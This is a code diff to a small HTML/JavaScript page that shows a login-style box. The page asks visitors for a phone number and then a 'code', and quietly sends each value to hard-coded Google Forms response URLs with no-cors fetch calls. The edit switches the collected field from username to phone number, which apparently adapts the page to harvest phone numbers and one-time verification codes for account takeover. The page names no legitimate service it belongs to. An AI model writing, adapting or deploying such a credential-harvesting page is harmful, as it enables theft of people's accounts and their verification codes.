@@ -34,7 +34,15 @@
       background: #0d0d0d; 
       color: #00aaff; 
       font-size: 16px;
+      /* Removes arrow spinners on number inputs in some browsers */
+      -moz-appearance: textfield;
     }
+    input::-webkit-outer-spin-button,
+    input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+
     input::placeholder { color: #005577; }
 
     button { 
@@ -61,31 +69,37 @@
 <body>
 
 <div class="box">
-  <h2 id="title">Enter Username</h2>
-  <input type="text" id="username" placeholder="Username">
+  <h2 id="title">Enter Phone Number</h2>
+  
+  <input type="tel" id="phone" placeholder="Phone Number">
+  
   <input type="text" id="code" placeholder="Code" class="hidden">
-  <button id="actionBtn" onclick="submitUsername()">Next</button>
+  <button id="actionBtn" onclick="submitPhone()">Next</button>
 </div>
 
 <script>
-  let savedUsername = "";
+  let savedPhone = "";
 
   // Google Form direct links (GET method)
-  const usernameFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1I13PmL2dkm2UOHkRxXdZ4IkoufowM4zhVXguy75Lq5Q/formResponse";
+  const phoneFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1I13PmL2dkm2UOHkRxXdZ4IkoufowM4zhVXguy75Lq5Q/formResponse";
   const codeFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSfxT6LNdV6yHLbQ6Q2G3pGso5L2-1SW9p4z1l793SUcuSahzAhqYmAgTGxLPYsrv0_y5ohUs/formResponse";
 
-  function submitUsername() {
-    let username = document.getElementById("username").value;
-    if(username==="") { alert("Please enter username"); return; }
-    savedUsername = username;
+  function submitPhone() {
+    let phoneInput = document.getElementById("phone").value;
+    
+    // Updated validation text
+    if(phoneInput === "") { alert("Please enter phone number"); return; }
+    
+    savedPhone = phoneInput;
 
     // Redirect to Form #1 (GET submission) without breaking page
-    const url = usernameFormURL + "?entry.2000000=" + encodeURIComponent(savedUsername);
+    // Note: Ensure entry.2000000 is the correct field ID for the phone number in your Google Form
+    const url = phoneFormURL + "?entry.2000000=" + encodeURIComponent(savedPhone);
     fetch(url, { mode: "no-cors" });
 
     // Switch to code input
     document.getElementById("title").innerText = "Enter Code";
-    document.getElementById("username").classList.add("hidden");
+    document.getElementById("phone").classList.add("hidden");
     document.getElementById("code").classList.remove("hidden");
 
     const btn = document.getElementById("actionBtn");
@@ -95,7 +109,7 @@
 
   function submitCode() {
     let code = document.getElementById("code").value;
-    if(code==="") { alert("Please enter code"); return; }
+    if(code === "") { alert("Please enter code"); return; }
 
     const url = codeFormURL + "?entry.2000000=" + encodeURIComponent(code);
     fetch(url, { mode: "no-cors" });
